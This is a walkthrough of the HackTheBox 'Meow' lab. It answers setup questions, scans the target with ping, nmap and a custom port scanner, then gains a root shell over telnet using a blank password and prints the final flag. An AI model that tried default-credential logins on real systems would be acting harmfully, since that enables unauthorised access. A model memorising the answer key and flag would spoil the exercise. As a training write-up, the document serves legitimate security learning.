
# HackTheBox - Meow

**Platform:** HackTheBox 

**Difficulty:** Very Easy

**⚠️Disclaimer:** This writeup contains direct answers to task questions, step-by-step solutions, and the final flag.

## Pre-Engagement & Setup

Before starting our enumeration, we need to connect to the lab environment. Here are the foundational concepts for connecting:

**In cybersecurity, isolated environments—like Pwnbox or the vulnerable target machines—are often VMs. What does VM stand for?**
> ### ✅ Answer: `Virtual Machine`

**What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.**
> ### ✅ Answer: `terminal`

**What service do we use to form our VPN connection into HTB labs?**
> ### ✅ Answer: `openvpn`

---

## Enumeration

First, we need to verify that our target is online and reachable. 

**What tool do we use to test our connection to the target with an ICMP echo request?**
> ### ✅ Answer: `ping`

We issue the `ping` command to the target IP to confirm we have a connection.

```bash
ping 10.129.185.241                                                                    
```
```text
PING 10.129.185.241 (10.129.185.241) 56(84) bytes of data.
64 bytes from 10.129.185.241: icmp_seq=1 ttl=63 time=63.6 ms
64 bytes from 10.129.185.241: icmp_seq=2 ttl=64.7 ms
64 bytes from 10.129.185.241: icmp_seq=3 ttl=66.0 ms
^C
--- 10.129.185.241 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 63.586/64.760/66.041/1.005 ms
```

Next, we need to scan for open ports.

**What is the name of the most common tool for finding open ports on a target?**
> ### ✅ Answer: `nmap`

We perform a port scan with service detection using `nmap` to identify open ports and the services running on them.

```bash
nmap -sV 10.129.185.241
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 20:20 +0200
Nmap scan report for 10.129.185.241
Host is up (0.066s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
```

**Alternative Enumeration:**
As an alternative to Nmap, a custom Python port scanner (`viper.py`) can be used to quickly identify open ports.
The tool is avalibel here:https://github.com/Vlone-p/viper
```bash
python viper.py 10.129.185.241 -sV
```
```text
____   ____.__                     
\   \ /   /|__|_____   ___________ 
 \   Y   / |  \____ \_/ __ \_  __ \
  \     /  |  |  |_> >  ___/|  | \/
   \___/   |__|   __/ \___  >__|   
              |__|        \/       v1.1

[*] Starting scan on 10.129.185.241 (10.129.185.241)
[*] Thread count set to 100

[*] Scanning top 58 common ports... (Use -p to specify a range)

==================================================
SCAN RESULTS
==================================================
PORT       STATE      SERVICE
-----------------------------
23         open Telnet
==================================================
Scan completed in 1.64 seconds
```

Based on our scan results, we found a service running on port 23.

**What service do we identify on port 23/tcp during our scans?**
> ### ✅ Answer: `telnet`

---

## Exploitation

Because Telnet is running and often relies on default or weak credentials, we attempt to connect to the target using the `telnet` client. 

**What username is able to log into the target over telnet with a blank password?**
> ### ✅ Answer: `root`

We try the default administrative username `root` and leave the password blank.

```bash
telnet 10.129.185.241                                                                  
```
```text
Trying 10.129.185.241...
Connected to 10.129.185.241.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
# No password required, press Enter
```

We successfully gain a root shell on the target machine without needing to escalate privileges.

---

## Flag Retrieval

Now that we have access as the `root` user, we list the contents of the home directory to locate the flag file.

```bash
ls
```
```text
flag.txt  snap
```

We read the contents of the file to retrieve the final flag.

```bash
cat flag.txt
```
```text
b40abdfe23665f766f9c61ecba8a4c19
```
**Submit the flag located in root's home directory.**
> ### ✅ Answer: `b40abdfe23665f766f9c61ecba8a4c19`
